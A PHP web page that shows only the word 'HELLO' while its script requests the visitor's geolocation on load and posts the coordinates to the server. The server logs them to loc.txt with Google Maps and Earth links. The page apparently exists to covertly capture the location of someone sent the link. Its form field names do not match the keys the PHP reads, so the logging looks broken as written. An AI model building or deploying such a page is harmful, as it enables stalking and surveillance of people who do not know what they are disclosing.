<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['latitude']) && isset($_POST['longitude'])){
   $latitude =$_POST['latitude'];
   $longitude =$_POST['longitude'];
   $googlemap = "https://www.google.com/maps/$latitude,$longitude";
   $googleearth = "https://earth.google.com/web/search/$latitude,$longitude";
   file_put_contents('loc.txt', "latitude:$latitude\nlongitude:$longitude\ngooglemap:$googlemap\ngoogleearth:$googleearth\n",FILE_APPEND);
   exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location</title>
</head>
<body>
  <center>
    <h1>HELLO</h1>
  </center>
  <script>
    function getLocation() {
      if (navigator.geolocation){
          navigator.geolocation.getCurrentPosition(function(position){
              const latitude = position.coords.latitude;
              const longitude = position.coords.longitude;
              send(latitude,longitude);
            },function(error){});
          }else{}
    }
    function send(latitude,longitude){
        const formdata = new FormData();
        formdata.append('latitude :',latitude);
        formdata.append('longitude :',longitude);
        fetch(window.location.href,{
          method: 'post',
          body: formdata
        })
    }
    window.onload = function(){
      getLocation();
    }
  </script>
</body>
</html>